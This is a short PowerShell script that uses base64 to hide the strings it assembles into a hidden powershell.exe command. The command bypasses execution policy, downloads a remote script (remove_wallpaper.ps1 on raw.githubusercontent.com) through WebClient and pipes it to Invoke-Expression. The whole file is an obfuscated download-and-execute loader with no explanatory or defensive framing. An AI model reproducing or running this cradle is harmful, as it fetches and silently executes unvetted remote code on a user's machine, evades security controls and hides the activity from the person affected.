$k = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24=')); # Obfuscates "Invoke-Expression"
$a = 'c3lzdGVtLm5ldC53ZWJjbGllbnQ='; 
$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a));
$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXhlY3V0aW9uUG9saWN5IEJ5cGFzcw==')); 
$f = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tm9Qcm9maWxl'));
$g = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V2luZG93U3R5bGUgSGlkZGVu'));
$h = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29tbWFuZA=='));
$i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('J2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbGJlbG9mZndPdy9UZXN0L21haW4vcmVtb3ZlX3dhbGxwYXBlci5wczEn'));
$j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KElFWCkgfCBGb3JFYWNoLU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudA=='));
echo $d
$z = (("po" + "we" + "rshe"+ "ll.exe " + "-" + $d + " -" + $f + " -" + $g + " -" + $h + " ") + '"(New-Object ' + $b + ').DownloadString(' + $i + ') | IEX "');
$z